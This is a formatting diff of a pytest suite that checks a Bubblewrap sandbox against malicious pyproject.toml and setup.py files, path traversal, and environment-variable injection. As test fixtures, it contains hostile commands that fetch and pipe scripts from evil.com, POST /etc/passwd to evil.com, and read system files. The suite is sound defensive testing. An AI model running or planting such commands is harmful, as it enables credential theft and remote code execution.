@@ -7,7 +7,11 @@ arbitrary code.
 
 import pytest
 from pathlib import Path
-from devloop.security.sandbox import SandboxConfig, CommandNotAllowedError, SandboxTimeoutError
+from devloop.security.sandbox import (
+    SandboxConfig,
+    CommandNotAllowedError,
+    SandboxTimeoutError,
+)
 from devloop.security.bubblewrap_sandbox import BubblewrapSandbox
 
 
@@ -37,7 +41,9 @@ class TestMaliciousPyprojectToml:
     """Test protection against malicious pyproject.toml files."""
 
     @pytest.mark.asyncio
-    async def test_malicious_poetry_scripts_blocked(self, sandbox_config, malicious_workspace):
+    async def test_malicious_poetry_scripts_blocked(
+        self, sandbox_config, malicious_workspace
+    ):
         """Malicious poetry scripts with shell commands should be blocked."""
         sandbox = BubblewrapSandbox(sandbox_config)
 
@@ -58,13 +64,12 @@ backdoor = "subprocess:call(['curl', 'evil.com/shell.sh', '-o', '/tmp/shell.sh']
 
         # Try to execute poetry install (should be blocked because poetry not in whitelist)
         with pytest.raises(CommandNotAllowedError):
-            await sandbox.execute(
-                ["poetry", "install"],
-                cwd=malicious_workspace
-            )
+            await sandbox.execute(["poetry", "install"], cwd=malicious_workspace)
 
     @pytest.mark.asyncio
-    async def test_malicious_build_system_blocked(self, sandbox_config, malicious_workspace):
+    async def test_malicious_build_system_blocked(
+        self, sandbox_config, malicious_workspace
+    ):
         """Malicious build-system configuration should be blocked."""
         sandbox = BubblewrapSandbox(sandbox_config)
 
@@ -84,17 +89,16 @@ setup_requires = ["os.system('curl evil.com/malware.sh | sh')"]
 
         # Try to run pip install (should be blocked because pip not in whitelist)
         with pytest.raises(CommandNotAllowedError):
-            await sandbox.execute(
-                ["pip", "install", "."],
-                cwd=malicious_workspace
-            )
+            await sandbox.execute(["pip", "install", "."], cwd=malicious_workspace)
 
 
 class TestMaliciousSetupPy:
     """Test protection against malicious setup.py files."""
 
     @pytest.mark.asyncio
-    async def test_setup_py_with_os_system_blocked(self, sandbox_config, malicious_workspace):
+    async def test_setup_py_with_os_system_blocked(
+        self, sandbox_config, malicious_workspace
+    ):
         """setup.py with os.system() calls should not execute shell commands."""
         sandbox = BubblewrapSandbox(sandbox_config)
 
@@ -102,7 +106,7 @@ class TestMaliciousSetupPy:
             pytest.skip("Bubblewrap not available")
 
         # Create malicious setup.py
-        malicious_setup = '''
+        malicious_setup = """
 import os
 import sys
 
@@ -114,16 +118,13 @@ os.system("curl evil.com/malware.sh -o /tmp/malware.sh")
 os.system("curl -X POST evil.com/steal -d @/etc/passwd")
 
 print("setup.py executed", file=sys.stderr)
-'''
+"""
         (malicious_workspace / "setup.py").write_text(malicious_setup)
         (malicious_workspace / "test_marker.txt").write_text("marker")
 
         # Execute the setup.py in sandbox (python3 is allowed)
         # Network should be blocked, file system isolated
-        result = await sandbox.execute(
-            ["python3", "setup.py"],
-            cwd=malicious_workspace
-        )
+        result = await sandbox.execute(["python3", "setup.py"], cwd=malicious_workspace)
 
         # setup.py can run but malicious actions should fail
         # Check that marker file still exists (rm didn't work)
@@ -134,7 +135,9 @@ print("setup.py executed", file=sys.stderr)
         # The key is that network is isolated and sensitive files can't be accessed
 
     @pytest.mark.asyncio
-    async def test_setup_py_with_subprocess_blocked(self, sandbox_config, malicious_workspace):
+    async def test_setup_py_with_subprocess_blocked(
+        self, sandbox_config, malicious_workspace
+    ):
         """setup.py with subprocess calls should be restricted."""
         sandbox = BubblewrapSandbox(sandbox_config)
 
@@ -142,7 +145,7 @@ print("setup.py executed", file=sys.stderr)
             pytest.skip("Bubblewrap not available")
 
         # Create malicious setup.py with subprocess
-        malicious_setup = '''
+        malicious_setup = """
 import subprocess
 import sys
 
@@ -153,21 +156,23 @@ try:
     print("subprocess succeeded", file=sys.stderr)
 except Exception as e:
     print(f"subprocess failed: {e}", file=sys.stderr)
-'''
+"""
         (malicious_workspace / "setup.py").write_text(malicious_setup)
 
         # Execute setup.py - bash/sh may be available but access is restricted
-        result = await sandbox.execute(
-            ["python3", "setup.py"],
-            cwd=malicious_workspace
-        )
+        result = await sandbox.execute(["python3", "setup.py"], cwd=malicious_workspace)
 
         # Check that malicious actions failed (can't access /etc/passwd)
         # The security model allows commands to run but restricts filesystem access
-        assert "No such file or directory" in result.stderr or "Permission denied" in result.stderr
+        assert (
+            "No such file or directory" in result.stderr
+            or "Permission denied" in result.stderr
+        )
 
     @pytest.mark.asyncio
-    async def test_setup_py_import_restrictions(self, sandbox_config, malicious_workspace):
+    async def test_setup_py_import_restrictions(
+        self, sandbox_config, malicious_workspace
+    ):
         """setup.py should not be able to import and execute arbitrary code."""
         sandbox = BubblewrapSandbox(sandbox_config)
 
@@ -175,7 +180,7 @@ except Exception as e:
             pytest.skip("Bubblewrap not available")
 
         # Create malicious setup.py that tries to import system modules
-        malicious_setup = '''
+        malicious_setup = """
 import sys
 try:
     # Try to import ctypes and execute arbitrary code
@@ -192,14 +197,11 @@ try:
     print("exec attack succeeded", file=sys.stderr)
 except Exception as e:
     print(f"exec attack failed: {e}", file=sys.stderr)
-'''
+"""
         (malicious_workspace / "setup.py").write_text(malicious_setup)
 
         # Execute setup.py - even if imports work, actions should be restricted
-        result = await sandbox.execute(
-            ["python3", "setup.py"],
-            cwd=malicious_workspace
-        )
+        result = await sandbox.execute(["python3", "setup.py"], cwd=malicious_workspace)
 
         # Code can run but should be isolated (network/filesystem restrictions)
         # The sandbox prevents the actual damage even if python code executes
@@ -209,7 +211,9 @@ class TestPathTraversal:
     """Test protection against path traversal attacks."""
 
     @pytest.mark.asyncio
-    async def test_relative_path_traversal_blocked(self, sandbox_config, malicious_workspace):
+    async def test_relative_path_traversal_blocked(
+        self, sandbox_config, malicious_workspace
+    ):
         """Path traversal using relative paths should be blocked."""
         sandbox = BubblewrapSandbox(sandbox_config)
 
@@ -217,7 +221,7 @@ class TestPathTraversal:
             pytest.skip("Bubblewrap not available")
 
         # Create a Python script that tries path traversal
-        path_traversal_script = '''
+        path_traversal_script = """
 import sys
 try:
     # Try to read sensitive files using relative paths
@@ -234,12 +238,11 @@ try:
     print("SUCCESS: Wrote outside workspace", file=sys.stderr)
 except Exception as e:
     print(f"BLOCKED: {e}", file=sys.stderr)
-'''
+"""
         (malicious_workspace / "traversal.py").write_text(path_traversal_script)
 
         result = await sandbox.execute(
-            ["python3", "traversal.py"],
-            cwd=malicious_workspace
+            ["python3", "traversal.py"], cwd=malicious_workspace
         )
 
         # Both attempts should be blocked
@@ -247,7 +250,9 @@ except Exception as e:
         assert "SUCCESS" not in result.stderr or result.exit_code != 0
 
     @pytest.mark.asyncio
-    async def test_absolute_path_traversal_blocked(self, sandbox_config, malicious_workspace):
+    async def test_absolute_path_traversal_blocked(
+        self, sandbox_config, malicious_workspace
+    ):
         """Path traversal using absolute paths should be blocked."""
         sandbox = BubblewrapSandbox(sandbox_config)
 
@@ -255,7 +260,7 @@ except Exception as e:
             pytest.skip("Bubblewrap not available")
 
         # Create a Python script that tries absolute path access
-        path_script = '''
+        path_script = """
 import sys
 try:
     # Try to read system files
@@ -271,12 +276,11 @@ try:
     print(f"SUCCESS: Listed /root: {files}", file=sys.stderr)
 except Exception as e:
     print(f"BLOCKED: {e}", file=sys.stderr)
-'''
+"""
         (malicious_workspace / "absolute.py").write_text(path_script)
 
         result = await sandbox.execute(
-            ["python3", "absolute.py"],
-            cwd=malicious_workspace
+            ["python3", "absolute.py"], cwd=malicious_workspace
         )
 
         # Access should be blocked
@@ -287,7 +291,9 @@ class TestEnvironmentVariableInjection:
     """Test protection against environment variable injection."""
 
     @pytest.mark.asyncio
-    async def test_env_var_injection_filtered(self, sandbox_config, malicious_workspace):
+    async def test_env_var_injection_filtered(
+        self, sandbox_config, malicious_workspace
+    ):
         """Malicious environment variables should be filtered."""
         sandbox = BubblewrapSandbox(sandbox_config)
 
@@ -295,7 +301,7 @@ class TestEnvironmentVariableInjection:
             pytest.skip("Bubblewrap not available")
 
         # Create script that checks environment variables
-        env_script = '''
+        env_script = """
 import os
 import sys
 
@@ -315,7 +321,7 @@ for var in dangerous_vars:
         print(f"{var}={value}", file=sys.stderr)
     else:
         print(f"{var}=NOT_SET", file=sys.stderr)
-'''
+"""
         (malicious_workspace / "env_check.py").write_text(env_script)
 
         # Try to inject malicious environment variables
@@ -327,9 +333,7 @@ for var in dangerous_vars:
         }
 
         result = await sandbox.execute(
-            ["python3", "env_check.py"],
-            cwd=malicious_workspace,
-            env=malicious_env
+            ["python3", "env_check.py"], cwd=malicious_workspace, env=malicious_env
         )
 
         # Only PYTHONPATH should be set (it's in allowed_env_vars)
@@ -339,7 +343,9 @@ for var in dangerous_vars:
         assert "SECRET_TOKEN=should_not_appear" not in result.stderr
 
     @pytest.mark.asyncio
-    async def test_env_var_code_injection_blocked(self, sandbox_config, malicious_workspace):
+    async def test_env_var_code_injection_blocked(
+        self, sandbox_config, malicious_workspace
+    ):
         """Environment variables with code injection attempts should not execute."""
         sandbox = BubblewrapSandbox(sandbox_config)
 
@@ -347,7 +353,7 @@ for var in dangerous_vars:
             pytest.skip("Bubblewrap not available")
 
         # Create script that uses env var in dangerous way
-        env_injection_script = '''
+        env_injection_script = """
 import os
 import sys
 
@@ -361,7 +367,7 @@ try:
     print("Command executed", file=sys.stderr)
 except Exception as e:
     print(f"Blocked: {e}", file=sys.stderr)
-'''
+"""
         (malicious_workspace / "inject.py").write_text(env_injection_script)
 
         # Try to inject malicious command
@@ -370,9 +376,7 @@ except Exception as e:
         }
 
         result = await sandbox.execute(
-            ["python3", "inject.py"],
-            cwd=malicious_workspace,
-            env=malicious_env
+            ["python3", "inject.py"], cwd=malicious_workspace, env=malicious_env
         )
 
         # USER_COMMAND should be filtered (not in allowed list)
@@ -385,7 +389,9 @@ class TestConfigFileInclusion:
     """Test protection against malicious file inclusion in configs."""
 
     @pytest.mark.asyncio
-    async def test_config_file_inclusion_blocked(self, sandbox_config, malicious_workspace):
+    async def test_config_file_inclusion_blocked(
+        self, sandbox_config, malicious_workspace
+    ):
         """Config files should not be able to include/execute other files."""
         sandbox = BubblewrapSandbox(sandbox_config)
 
@@ -393,15 +399,15 @@ class TestConfigFileInclusion:
             pytest.skip("Bubblewrap not available")
 
         # Create a malicious Python file to be included
-        malicious_module = '''
+        malicious_module = """
 import os
 os.system("touch /tmp/included_pwned")
 print("Malicious module loaded")
-'''
+"""
         (malicious_workspace / "malicious_module.py").write_text(malicious_module)
 
         # Create setup.py that includes the malicious module
-        setup_with_inclusion = '''
+        setup_with_inclusion = """
 import sys
 sys.path.insert(0, ".")
 
@@ -410,14 +416,11 @@ try:
     print("Successfully imported malicious module")
 except Exception as e:
     print(f"Failed to import: {e}")
-'''
+"""
         (malicious_workspace / "setup.py").write_text(setup_with_inclusion)
 
         # Execute setup.py - the import will work but system commands restricted
-        result = await sandbox.execute(
-            ["python3", "setup.py"],
-            cwd=malicious_workspace
-        )
+        result = await sandbox.execute(["python3", "setup.py"], cwd=malicious_workspace)
 
         # Import can succeed but malicious actions should be restricted
         # (filesystem isolation, no shell access)
